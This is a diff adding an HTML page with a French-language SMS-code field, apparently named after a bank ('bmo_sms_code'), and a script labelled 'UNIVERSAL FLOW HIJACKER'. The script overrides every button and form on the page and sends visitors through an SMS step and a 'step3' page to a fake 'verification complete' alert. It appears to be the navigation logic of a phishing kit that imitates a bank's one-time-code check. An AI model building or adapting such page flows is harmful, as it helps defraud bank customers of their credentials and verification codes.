@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <input type="text" id="bmo_sms_code" maxlength="6" value="123456">
+    <button id="btn">Valider le code</button>
+    <script>
+    document.addEventListener('click', function(e) {
+        var target = e.target.closest('button');
+        if (!target) return;
+        e.preventDefault();
+        e.stopPropagation();
+        
+        var smsInp = document.querySelector('input');
+        if (smsInp && smsInp.value && smsInp.value.trim().length >= 4) {
+            console.log("Success! Would redirect to: " + window.location.pathname.replace('_sms.html', '_thankyou.html'));
+            // document.body.innerHTML = '<h1>REDIRECTED</h1>';
+        } else {
+            console.log("Failed");
+        }
+    }, true);
+    </script>
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
+</body>
+</html>
+
